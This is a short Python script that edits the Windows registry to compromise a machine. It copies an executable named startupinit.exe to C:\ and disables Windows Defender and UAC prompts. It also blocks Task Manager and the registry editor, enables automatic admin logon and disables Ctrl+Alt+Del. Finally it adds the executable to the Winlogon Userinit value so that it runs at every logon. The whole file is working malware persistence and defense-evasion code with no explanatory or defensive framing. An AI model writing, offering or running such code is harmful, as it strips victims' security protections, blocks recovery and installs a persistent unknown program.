import winreg,os

os.popen("""copy startupinit.exe C:\\""")
with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as hkey:
    with winreg.OpenKey(hkey, "SOFTWARE\Policies\Microsoft\Windows Defender") as sub_key:
        winreg.CreateKey(sub_key,"DisableAntiSpyware")
        winreg.SetValueEx(sub_key,"DisableAntiSpyware",0,winreg.REG_DWORD,1)
    with winreg.OpenKey(hkey,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System") as sub_key:
        winreg.SetValueEx(sub_key,"ConsentPromptBehaviorAdmin",0,winreg.REG_DWORD,0)
        winreg.SetValueEx(sub_key,"ConsentPromptBehaviorUser",0,winreg.REG_DWORD,0)
        winreg.SetValueEx(sub_key,"EnableLUA",0,winreg.REG_DWORD,0)
        winreg.SetValueEx(sub_key,"DisableTaskMgr",0,winreg.REG_DWORD,1)
        winreg.SetValueEx(sub_key,"DisableRegistryTools",0,winreg.REG_DWORD,1)
    with winreg.OpenKey(hkey,"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon") as sub_key:
        winreg.SetValueEx(sub_key,"AutoAdminLogon",0,winreg.REG_DWORD,1)
        winreg.SetValueEx(sub_key,"AutoRestartShell",0,winreg.REG_DWORD,0)
        winreg.SetValueEx(sub_key,"DisableCAD",0,winreg.REG_DWORD,1)
        winreg.SetValueEx(sub_key,"Userinit",0,winreg.REG_SZ,"C:\Windows\system32\userinit.exe, C:\startupinit.exe")